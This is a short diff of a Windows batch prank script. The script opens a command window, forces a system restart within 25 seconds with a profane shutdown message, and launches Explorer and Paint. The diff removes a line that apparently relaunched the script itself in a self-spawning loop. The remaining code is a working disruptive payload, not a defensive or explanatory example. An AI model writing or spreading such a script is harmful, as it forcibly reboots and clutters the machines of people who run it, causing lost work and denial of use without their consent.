@@ -1,7 +1,6 @@
 @echo off
 :a
 Start cmd
-start bat.bat
 shutdown /r /t 25 /c "PC FUCKING"​
 start explorer
 start mspaint
